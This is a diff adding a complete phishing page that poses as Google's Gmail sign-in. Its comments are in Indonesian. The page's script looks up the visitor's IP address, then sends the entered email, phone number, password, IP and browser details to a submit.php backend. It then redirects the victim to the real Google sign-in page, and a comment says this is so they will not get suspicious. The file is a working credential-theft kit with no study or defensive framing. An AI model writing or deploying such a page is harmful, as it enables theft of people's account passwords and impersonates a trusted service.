@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #fff;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .google-logo {
+            margin-bottom: 24px;
+        }
+
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .ip-display {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #5f6368;
+            text-align: left;
+            border: 1px solid #dadce0;
+        }
+
+        .ip-display span {
+            color: #1a73e8;
+            font-weight: bold;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1557b0;
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .error-msg {
+            background: #fce8e6;
+            color: #c5221f;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="google-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+                    <path fill="#4285F4" d="M67.954 16.303c-1.027 0-1.853-.223-2.476-.668-.623-.445-.935-1.087-.935-1.928 0-.792.287-1.454.86-1.986.573-.532 1.342-.798 2.306-.798.778 0 1.425.163 1.94.49.515.326.833.795.954 1.405.046.247.069.582.069 1.004v.668h-4.497c.047.416.18.747.4.992.22.245.514.368.883.368.4 0 .741-.119 1.024-.357.283-.238.467-.559.552-.962h2.169c-.144.861-.523 1.516-1.137 1.965-.614.449-1.353.673-2.216.673zm-1.88-4.052h2.53c-.042-.306-.175-.549-.4-.73-.225-.18-.505-.27-.84-.27-.337 0-.618.09-.843.27-.225.18-.368.424-.447.73zm-6.297 4.052c-1.203 0-2.129-.375-2.777-1.125-.648-.75-.972-1.768-.972-3.053 0-1.285.324-2.303.972-3.053.648-.75 1.574-1.125 2.777-1.125.611 0 1.145.126 1.603.378.458.252.811.61 1.058 1.075.247.465.371.992.371 1.581 0 .149-.01.305-.03.467h-3.89v1.567h5.476c-.034.545-.169 1.038-.406 1.478-.237.44-.551.794-.942 1.062-.391.268-.842.403-1.353.403zm-.092-1.424c.49 0 .882-.148 1.175-.443.293-.295.44-.695.44-1.2h-3.27c.018.498.164.892.44 1.183.275.291.65.437 1.124.437zm-6.318 1.424c-.57 0-1.066-.168-1.49-.504-.423-.336-.634-.827-.634-1.473 0-.687.216-1.189.649-1.507.433-.318 1.045-.477 1.836-.477.556 0 1.026.111 1.41.334.384.223.646.534.786.933.069.192.104.426.104.702v.464h-3.638c.034.302.159.54.374.713.215.173.497.26.847.26.304 0 .559-.08.765-.239.206-.159.344-.377.414-.654h1.849c-.113.749-.463 1.306-1.049 1.672-.586.366-1.318.549-2.196.549zm-.113-4.232c-.247 0-.462.073-.645.22-.183.146-.283.338-.3.575h1.845c-.02-.229-.106-.417-.258-.563-.152-.147-.358-.22-.618-.22h-.024zm-5.345 3.808c-1.014 0-1.756-.307-2.226-.921-.47-.614-.705-1.481-.705-2.6 0-1.116.235-1.977.705-2.583.47-.606 1.212-.909 2.226-.909.653 0 1.202.139 1.647.417.445.278.761.67.948 1.176.187.506.281 1.077.281 1.713 0 .096-.005.199-.015.308h-4.401v1.192h5.654c-.081.558-.255 1.038-.521 1.44-.266.402-.607.71-1.022.925-.415.215-.887.322-1.416.322zm-.086-1.219c.456 0 .827-.144 1.113-.432.286-.288.429-.682.429-1.182h-3.185c.019.5.156.892.41 1.176.254.284.62.426 1.099.426zm-5.2 1.219c-.69 0-1.205-.208-1.546-.624-.341-.416-.512-.993-.512-1.731 0-.752.173-1.328.52-1.73.346-.401.86-.602 1.543-.602.425 0 .801.096 1.128.287.327.191.562.46.705.806.143.346.215.73.215 1.153v.255h-3.19c.045.451.221.789.527 1.014.306.225.696.338 1.17.338.395 0 .729-.094 1.002-.283.273-.189.458-.451.555-.786h1.525c-.157.695-.483 1.236-.978 1.622-.495.386-1.111.579-1.847.579zm-.154-4.007c-.276 0-.503.102-.68.306-.177.204-.266.468-.266.792h1.822c-.008-.324-.098-.588-.27-.792-.172-.204-.397-.306-.676-.306h.07z"/>
+                </svg>
+            </div>
+            <h1>Sign in</h1>
+            <div class="subtitle">to continue to Gmail</div>
+
+            <div class="ip-display" id="ipDisplay">
+                🌐 Your IP Address: <span id="userIP">Detecting...</span>
+            </div>
+
+            <div class="error-msg" id="errorMsg">
+                ⚠️ Please fill all fields correctly
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>📧 Email or Phone</label>
+                    <input type="text" id="email" placeholder="example@gmail.com" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>📱 Phone Number (Optional)</label>
+                    <input type="tel" id="phone" placeholder="+62 xxx xxx xxx">
+                </div>
+                <div class="input-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="password" placeholder="Enter your password">
+                </div>
+                <button type="submit">Next</button>
+            </form>
+
+            <div class="footer">
+                <a href="#">Forgot password?</a> · <a href="#">Create account</a><br>
+                <span style="font-size: 11px;">🔒 Secure login by Google</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Deteksi IP User (Real IP)
+        async function getUserIP() {
+            const ipElement = document.getElementById('userIP');
+            
+            try {
+                // Pake multiple source biar akurat
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipElement.textContent = data.ip;
+                return data.ip;
+            } catch (error) {
+                try {
+                    const res2 = await fetch('https://api.my-ip.io/ip.json');
+                    const data2 = await res2.json();
+                    ipElement.textContent = data2.ip;
+                    return data2.ip;
+                } catch(e) {
+                    ipElement.textContent = 'Unable to detect';
+                    return 'Unknown';
+                }
+            }
+        }
+
+        getUserIP();
+
+        // Handle form submit
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+            const ip = document.getElementById('userIP').textContent;
+            
+            if (!email || !password) {
+                const errorMsg = document.getElementById('errorMsg');
+                errorMsg.style.display = 'block';
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            // Kirim data ke backend
+            const response = await fetch('submit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    phone: phone,
+                    password: password,
+                    ip: ip,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                // Redirect ke Google asli biar ga curiga
+                window.location.href = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com';
+            } else {
+                const errorMsg = document.getElementById('errorMsg');
+                errorMsg.textContent = '❌ ' + result.message;
+                errorMsg.style.display = 'block';
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
